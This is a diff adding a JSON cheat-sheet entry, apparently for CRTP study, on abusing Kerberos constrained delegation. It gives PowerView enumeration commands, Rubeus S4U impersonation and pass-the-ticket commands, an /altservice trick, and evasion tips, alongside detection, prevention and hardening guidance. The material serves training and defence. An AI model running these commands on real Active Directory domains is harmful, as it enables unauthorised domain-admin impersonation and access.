@@ -1,0 +1,103 @@
+{
+  "id": "crtp-constrained-delegation",
+  "name": "Constrained Delegation Abuse (S4U)",
+  "command": "Rubeus.exe s4u /user:<user> /rc4:<nt_hash> /impersonateuser:Administrator /msdsspn:'<spn>' /nowrap",
+  "description": "Abuse msDS-AllowedToDelegateTo to impersonate any user (including DA) against the allowed service using S4U2Self and S4U2Proxy.",
+  "platform": "windows",
+  "category": "Active Directory",
+  "subcategory": "Domain PrivEsc",
+  "type": "command",
+  "certifications": [
+    "CRTP"
+  ],
+  "source": "CRTP",
+  "opsec": "quiet",
+  "mitre": [
+    "T1558"
+  ],
+  "tools": [
+    "Rubeus"
+  ],
+  "tags": [
+    "constrained-delegation",
+    "s4u",
+    "impersonation",
+    "rubeus",
+    "msdsspn"
+  ],
+  "steps": [
+    {
+      "label": "Find constrained delegation users",
+      "command": "Get-DomainUser -TrustedToAuth | select samaccountname,msds-allowedtodelegateto"
+    },
+    {
+      "label": "Find constrained delegation computers",
+      "command": "Get-DomainComputer -TrustedToAuth | select name,msds-allowedtodelegateto"
+    },
+    {
+      "label": "S4U exploit with NTLM hash",
+      "command": "Rubeus.exe s4u /user:<user> /rc4:<nt_hash> /impersonateuser:Administrator /msdsspn:'<spn>' /nowrap"
+    },
+    {
+      "label": "Import and use ticket",
+      "command": "Rubeus.exe ptt /ticket:<base64_ticket>\nls \\\\<dc_host>\\C$"
+    }
+  ],
+  "examples": [
+    {
+      "label": "Find constrained delegation accounts",
+      "command": "Get-DomainUser -TrustedToAuth | select samaccountname,msds-allowedtodelegateto"
+    },
+    {
+      "label": "S4U to impersonate DA",
+      "command": "Rubeus.exe s4u /user:svcIIS /rc4:<nt_hash> /impersonateuser:Administrator /msdsspn:'http/webserver.corp.local' /nowrap"
+    },
+    {
+      "label": "Use altservice for CIFS access",
+      "command": "Rubeus.exe s4u /user:svcIIS /rc4:<nt_hash> /impersonateuser:Administrator /msdsspn:'http/webserver' /altservice:cifs /nowrap"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "crtp-credential-dumping",
+      "note": "Dump delegation account hash first",
+      "rel": "prereq"
+    },
+    {
+      "id": "rubeus-ptt",
+      "note": "Pass the S4U service ticket",
+      "rel": "next"
+    },
+    {
+      "id": "crtp-dcsync",
+      "note": "DCSync after gaining DA access",
+      "rel": "next"
+    }
+  ],
+  "notes": "/altservice allows protocol transition: even if only HTTP is in the allowed list, you can get CIFS/HOST/LDAP tickets.",
+  "references": [
+    {
+      "title": "CRTP - Constrained Delegation",
+      "url": "https://www.alteredsecurity.com/adlab"
+    },
+    {
+      "title": "HackTricks - Constrained Delegation",
+      "url": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/constrained-delegation"
+    }
+  ],
+  "defense": {
+    "why_it_works": "Constrained delegation (msDS-AllowedToDelegateTo) allows a service account to request Kerberos service tickets on behalf of any user (S4U2Self + S4U2Proxy) to a specific target service. If an attacker compromises a service account with constrained delegation rights, they can impersonate any domain user \u2014 including DA \u2014 to the target service without knowing any other user's credentials.",
+    "prerequisites": "Compromised account with msDS-AllowedToDelegateTo set (service account or computer account). Rubeus for S4U2Self/S4U2Proxy. NTLM hash or Kerberos key of the delegation account.",
+    "impact": "T1558 Steal or Forge Kerberos Tickets. Impersonates any domain user (including DA) to the delegated service. If the service is on a DC (e.g., ldap/dc01), attacker gets DA-level access to AD. S4U2Self works even for accounts marked sensitive/not delegatable.",
+    "detection": "Unusual S4U2Self/S4U2Proxy Kerberos requests \u2014 Event 4769 for constrained delegation with a service name different from the account's normal operation pattern. MDI: 'Suspected Kerberos constrained delegation abuse'. Event 4624 on target service from unexpected source using impersonated account. Rubeus S4U output generates multiple 4769 events in quick succession.\nAnomalous Kerberos activity: forged or stolen tickets by correlating malformed fields in logon events, RC4-encrypted TGTs, or TGS requests without corresponding TGT requests; suspicious processes accessing LSASS memory for ticket extraction (DET0522/AN1443).\nSuspicious access to SSSD secrets database and Kerberos key material indicating ticket theft or replay; correlate anomalous file access with unusual Kerberos service ticket requests (AN1444).\nForging or replaying Kerberos tickets: monitor Unified Logs for anomalous kinit/klist activity and unusual authentication sequences (AN1445).",
+    "artifacts": "Event 4769: S4U TGS request from delegation account for another user | MDI: constrained delegation abuse alert | Event 4624 on target with PA-DATA type 14 (S4U) | Kerberos log: AdditionalInfo field shows impersonation",
+    "prevention": "Audit constrained delegation accounts: Get-ADUser -Filter {msDS-AllowedToDelegateTo -ne '$null'}. Minimize accounts with delegation rights. Use resource-based constrained delegation (RBCD) instead \u2014 more granular. Mark sensitive accounts 'Account is sensitive and cannot be delegated'. Protect delegation account credentials (gMSA, strong password). MDI deployment.\nActive Directory Configuration: Reset KRBTGT account password twice (invalidates all golden tickets); rotate every 180 days.\nAudit: Scan for insecure Kerberos configurations.\nCredential Access Protection: On Linux, use SELinux to protect Kerberos key material.\nEncrypt Sensitive Information: Enable AES Kerberos encryption instead of RC4.\nPassword Policies: Service accounts should have 25+ character passwords; use Group Managed Service Accounts (gMSA).\nPrivileged Account Management: Limit domain admin to DCs only; restrict service account privileges.",
+    "evasion": "Impersonate a non-DA user that still has access to the target service (avoids DA-specific monitoring). Use /altservice flag in Rubeus to access a different service than what's configured (works because the TGS is signed by the target host, not the original service).",
+    "sources": [
+      "https://attack.mitre.org/techniques/T1558/"
+    ],
+    "misconfiguration": "Service accounts with constrained delegation to powerful services (ldap/dc01, cifs/dc01, host/dc01). Account not protected as sensitive. Delegation to HOST SPN \u2014 grants full code execution on the target host.",
+    "vulnerable_config": "# Accounts with constrained delegation:\nGet-ADUser -Filter {msDS-AllowedToDelegateTo -ne '$null'} -Properties msDS-AllowedToDelegateTo | Select-Object Name,msDS-AllowedToDelegateTo\n# svc_web \u2014 AllowedToDelegateTo: [ldap/DC01.corp.local] \u2192 can impersonate DA to DC LDAP\n\nGet-ADComputer -Filter {msDS-AllowedToDelegateTo -ne '$null'} -Properties msDS-AllowedToDelegateTo",
+    "secure_config": "# Mark sensitive accounts non-delegatable:\nGet-ADGroupMember 'Domain Admins' | ForEach-Object {\n  Set-ADAccountControl $_ -AccountNotDelegated $true\n}\n\n# Replace constrained delegation with RBCD (more controlled):\nClear-ADAccountAttribute -Identity svc_web -Attribute msDS-AllowedToDelegateTo\n# Then set RBCD on the target resource instead of the service account\n\n# Use gMSA for delegation-capable service accounts:\nNew-ADServiceAccount -Name 'svc_web_gmsa' -DNSHostName 'web.corp.local' -PrincipalsAllowedToRetrieveManagedPassword 'WEB01$'\n\n# SIEM: alert on S4U delegation from non-expected accounts:\n# EventID=4769 AND TicketOptions=0x50800000 (includes forwardable via S4U) AND ServiceName != expected_service \u2192 ALERT"
+  }
+}
